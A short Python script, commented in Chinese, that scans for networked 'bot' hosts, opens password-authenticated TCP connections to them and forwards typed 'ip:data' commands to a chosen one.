from tcp_user import tcp_user
from get_bot_ipv4 import get_ip ,scan_ip

bot_num = 0

scan_ip()
print(get_ip())
bot_num = len(get_ip())

# 生成机器人对象
bot_list = [_ for _ in range(bot_num)] 
bot_dic = {}

# 筛选可用连接
for i in range(bot_num):
    print('尝试建立连接',i,':',get_ip()[i])
    try:
        bot_list[i] = tcp_user(get_ip()[i],'yuk2')
        bot_list[i].thread_listen()
        bot_list[i].send_pass()
        print(i,get_ip()[i],'建立成功')
        bot_dic[get_ip()[i]] = [bot_list[i],'yuk2']
    except:
        print(i,get_ip()[i],'不可用或没有开启TCP服务器')
        bot_list.pop()
print('可用连接:',bot_dic)

def cmd(cmds):
    '''拆分字符,定向发送'''
    global bot_dic
    try:
        list_1 = cmds.split(':')
        bot_dic[list_1[0]][0].send_data(list_1[1])
    except:
        print('语法错误 或 ip不存在')

while True:
    cmd(input())
